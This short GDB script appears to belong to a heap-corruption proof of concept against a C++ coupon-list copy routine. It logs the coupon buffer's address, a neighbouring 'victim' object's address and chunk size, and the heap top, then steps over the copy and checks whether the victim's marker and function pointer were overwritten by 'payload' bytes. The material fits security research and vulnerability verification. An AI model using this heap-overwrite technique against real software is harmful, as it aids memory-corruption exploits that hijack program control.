# Show the allocation order for the typed-object adjacency probe: the live
# victim is below the coupon vector; only wilderness is above it.
set pagination off
set confirm off
break CouponList-internal.hpp:116
run
printf "GDB_COPY_SITE\n"
set $p = (unsigned char*) sketch->coupons_._M_impl._M_start
printf "GDB_COUPON_DATA=%p count=%u\n", $p, couponCount
frame 3
printf "GDB_VICTIM_ADDR=%p\n", before
printf "GDB_VICTIM_CHUNK_SIZE=%#lx\n", *(unsigned long*)((char*)before - 8)
printf "GDB_SBRK=%p\n", (void*) sbrk(0)
frame 0
next
frame 3
printf "GDB_VICTIM_AFTER marker=%016lx fp=%p\n", before->marker, before->fp
printf "GDB_PAYLOAD(p+32..p+55)\n"
x/3gx $p+32
continue
printf "GDB_DONE\n"
